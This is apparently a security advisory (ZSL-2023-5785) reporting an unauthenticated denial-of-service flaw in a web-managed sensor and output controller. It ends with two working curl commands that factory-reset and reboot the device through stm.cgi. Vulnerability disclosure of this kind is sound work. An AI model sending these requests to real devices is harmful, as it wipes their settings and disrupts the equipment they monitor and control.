The device provides a user interface\nin the form of a web page. The website presents\nreadings of various types of sensors: temperature,\nhumidity, pressure, voltage, current. It also\nallows you to configure the device, incl. event\nsetting and controlling up to 10 outputs. Thanks\nto the support of many protocols, it is possible\nto operate from smartphones, collect and observ\nthe results on the server, as well as cooperation\nwith other I/O systems based on TCP/IP and Modbus.\n\nDesc: The controller suffers from an unauthenticated\nremote denial of service vulnerability. An attacker\ncan issue direct requests to the stm.cgi page to\nreboot and also reset factory settings on the device.\n\nTested on: lwIP\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2023-5785\nAdvisory ID: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5785.php\n\n\n18.08.2023\n\n--\n\n\n$ curl http://192.168.1.1:8082/stm.cgi?eeprom_reset=1 # restore default settings\n$ curl http://192.168.1.1:8082/stm.cgi?lk3restart=1   # reboot controller\n            "}
